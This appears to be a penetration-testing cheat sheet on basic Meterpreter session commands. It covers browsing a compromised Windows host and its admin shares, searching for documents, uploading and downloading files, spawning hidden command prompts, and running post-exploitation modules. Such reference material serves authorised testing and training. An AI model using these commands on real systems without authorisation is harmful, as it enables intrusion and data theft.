# 02 - Basic Commands

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

## 2.1 - Navigation

Change Directory

```
meterpreter > cd <directory>
```

Get current working directory

```
meterpreter > pwd
C:\Users\aiden\
```

## 2.2 - List Contents

```
meterpreter > ls -h
Usage: ls [options] [glob/path]

Lists contents of directory or file info, searchable

OPTIONS:

    -h   Help banner
    -l   List in long format (default)
    -r   Reverse sort order
    -R   Recursively list subdirectories encountered
    -S   Search string on filename (as regular expression)
    -s   Sort by size
    -t   Sort by time
    -x   Show short file names

meterpreter > ls
Listing: C:\Users\Winpwn10
==========================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  4096     dir   2022-05-09 17:53:48 -0400  .dotnet
040777/rwxrwxrwx  0        dir   2022-05-09 19:33:53 -0400  .nuget
040777/rwxrwxrwx  0        dir   2022-05-09 16:57:08 -0400  .omnisharp
040777/rwxrwxrwx  0        dir   2022-05-09 19:11:13 -0400  .templateengine
040777/rwxrwxrwx  0        dir   2022-05-09 16:49:34 -0400  .vscode
040777/rwxrwxrwx  0        dir   2022-04-17 21:03:00 -0400  AppData
040777/rwxrwxrwx  0        dir   2022-04-17 21:03:00 -0400  Application Data
040555/r-xr-xr-x  0        dir   2022-04-17 21:03:26 -0400  Contacts
..[omitted]..

meterpreter > ls c:\\users\\
Listing: c:\users\
==================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2021-06-05 08:26:17 -0400  All Users
040555/r-xr-xr-x  8192  dir   2022-04-18 03:51:37 -0400  Default
040777/rwxrwxrwx  0     dir   2021-06-05 08:26:17 -0400  Default User
040555/r-xr-xr-x  4096  dir   2022-04-17 21:03:26 -0400  Public
040777/rwxrwxrwx  8192  dir   2022-05-09 19:33:53 -0400  Winpwn10
100666/rw-rw-rw-  174   fil   2021-06-05 08:08:53 -0400  desktop.ini

meterpreter > ls //ws01/c$

meterpreter > ls \\\\ws01\\c$
Listing: \\ws01\C$
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2022-04-18 12:36:20 -0400  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2022-05-14 17:03:46 -0400  $WinREAgent
040777/rwxrwxrwx  0      dir   2022-04-18 03:51:37 -0400  Documents and Settings
000000/---------  0      fif   1969-12-31 19:00:00 -0500  DumpStack.log.tmp
040777/rwxrwxrwx  0      dir   2021-06-05 08:10:48 -0400  PerfLogs
040555/r-xr-xr-x  8192   dir   2022-05-09 18:58:12 -0400  Program Files
040555/r-xr-xr-x  4096   dir   2022-05-09 18:58:12 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2022-05-09 18:58:34 -0400  ProgramData
040777/rwxrwxrwx  0      dir   2022-05-06 19:38:10 -0400  Recovery
040777/rwxrwxrwx  4096   dir   2022-04-18 03:52:05 -0400  System Volume Information
040555/r-xr-xr-x  4096   dir   2022-04-17 21:21:15 -0400  Users
040777/rwxrwxrwx  16384  dir   2022-04-30 20:39:06 -0400  Windows
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys
000000/---------  0      fif   1969-12-31 19:00:00 -0500  swapfile.sys
040777/rwxrwxrwx  0      dir   2022-05-09 16:29:41 -0400  tools

meterpreter > ls -S ".docx" c:/users/%username%/documents/
```

## 2.3 - File Manipulation

### 2.3.1 - Copy files

```
meterpreter > cp
Usage: cp oldfile newfile
```

### 2.3.2 - Move files

```
meterpreter > mv
Usage: mv oldfile newfile
```

### 2.3.3 - Delete files

```
meterpreter > rm
Usage: rm file1 [file2...]
```

### 2.3.4 - Create Directories

```
meterpreter > mkdir
Usage: mkdir dir1 dir2 dir3 ...
```

### 2.3.5 - Remove Directories

```
meterpreter > rmdir
Usage: rmdir dir1 dir2 dir3 ...
```

### 2.3.6 - Create/Edit the file

> [!NOTE]
> The default editor is `vim` if it's missing it'll switch to `nano` instead.

```
meterpreter > edit
Edit a file on remote machine.
Usage: edit file

meterpreter > edit file.txt
```

### 2.3.7 - Checksum File hashes

```
meterpreter > checksum -h
Usage: checksum [md5 / sha1] file1 file2 file3 ...
```

MD5 Hash

```
meterpreter > checksum md5 file.txt
d4142d7def55ea1dfb6875f28cf08d9b  file.txt
```

## 2.4 - Upload and Download Files

```
meterpreter > upload -h
Usage: upload [options] src1 src2 src3 ... destination

Uploads local files and directories to the remote machine.

OPTIONS:

    -h  Help banner
    -r  Upload recursively

meterpreter > download -h
Usage: download [options] src1 src2 src3 ... destination

Downloads remote files and directories to the local machine.

OPTIONS:

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

## 2.5 - Load Extension

```
meterpreter > load <extension>
```

## 2.6 - Modules

> [!INFO]
> Only post exploitation and local exploit to reveal available options and execute.

What options are required to execute the module.

```
meterpreter > info <post_module | local_exploit_module>
```

Run post exploitation module.

```
meterpreter > run <post_module | local_exploit_module>
```

## 2.7 - Channels

```
meterpreter > channel -h
Usage: channel [options]

Displays information about active channels.

OPTIONS:

    -c   Close the given channel.
    -h   Help menu.
    -i   Interact with the given channel.
    -k   Close the given channel.
    -K   Close all channels.
    -l   List active channels.
    -r   Read from the given channel.
    -w   Write to the given channel.
```

List active channels.

```
meterpreter > channel -l

    Id  Class  Type
    --  -----  ----
    7   3      stdapi_process
    8   3      stdapi_process
    9   3      stdapi_process
    10  3      stdapi_process
    11  3      stdapi_process
    12  3      stdapi_process
    13  3      stdapi_process
    14  3      stdapi_process
    16  3      stdapi_process
    17  3      stdapi_process
    18  3      stdapi_process
    19  3      stdapi_process
```

Spawn the command prompt then interact it manually using `channel`.

```
meterpreter > execute -Hcf cmd.exe

meterpreter > channel -i <channel_ID>
```

Spawn the command prompt.

```
meterpreter > execute -Hcf cmd.exe
```

Then insert commands to a specific `channel` ID.

```
meterpreter > channel -w <channel_ID>
Enter data followed by a '.' on a empty line:

whoami.exe
ping.exe -n 1 127.0.0.1
.
[*] Wrote <bytes> bytes to channel <channel_ID>
```

Then print the output instead of doing it interactively.

```
meterpreter > channel -r <channel_ID>
Read <bytes> bytes from <channel_ID>:
```

Terminate a specific channel ID.

```
meterpreter > channel -k <channel_ID>
```

Terminate all channels.

```
meterpreter > channel -K
Killing all channels...
Killed all channels.
```

## 2.8 - Background

```
meterpreter > background
[*] Backgrounding session 1...
```

## 2.9 - Re-encrypt key

(Re)negotiate TLV packets for encryption.

```
meterpreter > secure
[*] Negotiating new encryption key ...
[+] Done.
```

## 2.10 - Spawn Interactive Shell

TODO: Fill this info

Windows

```
meterpreter > shell
```

Linux

```
meterpreter > shell -t
```

```
msf > use post/multi/manage/open

msf > use post/multi/general/close
```

```
msf > use post/multi/general/execute

msf post(multi/general/execute) > set command <commands>

msf post(multi/general/execute) > run session=<session_ID>
```